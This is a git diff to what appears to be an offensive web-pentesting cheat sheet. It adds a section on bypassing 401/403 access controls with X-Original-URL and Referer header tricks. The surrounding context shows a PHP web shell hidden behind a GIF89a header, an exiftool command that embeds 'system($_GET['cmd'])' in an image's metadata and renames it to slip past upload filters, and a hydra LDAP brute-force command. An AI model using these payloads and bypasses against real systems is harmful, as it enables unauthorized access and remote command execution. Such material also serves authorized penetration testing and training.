@@ -23,7 +23,9 @@
      - [brute force >](#brute-force)
             - [hydra](#hydra)
             - [ffuf](#ffuf)
-  - [Bypass file upload filtering](#bypass-file-upload-filtering)
+   - [Bypass technics](#bypass-technics)
+  	- [Bypass file upload filtering](#bypass-file-upload-filtering)
+  	- [401/403 bypass](#401/403-bypass)
   - [Open redirect](#open-web-redirect)
   - [PHP filter](#php-filters-for-lfi)
   - [Cross Side Scripting (XSS)](#xss-common-payloads)
@@ -150,7 +152,8 @@ The following table uses the $ip variable which can be set with the following co
 | `hydra -L users.txt -P passwords.txt $ip ldap2 -V -f` | LDAP Brute Forcing |
 
 -----------------------------------------------------------------------------------------------------------------
-# Bypass File Upload Filtering
+# Bypass
+### Bypass File Upload Filtering
 
 `GIF89a`
 ```php
@@ -166,6 +169,16 @@ system($_GET['cmd']);
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' evil.jpg
 
 mv evil.jpg evil.php.jpg
+```
+### 401/403 Bypass
+```
+GET /api/getUser --> 403
+GET / + X-Original-URL : /api/GetUser --> 200
+
+GET /api/getUser --> 403
+GET / + Referer : https://site.com/api/GetUser --> 200
+or
+GET /api/getUser + Referer : https://site.com/api/GetUser --> 200
 ```
 -------------------------------------------------------------------------------------------------------------
 # Open web redirect
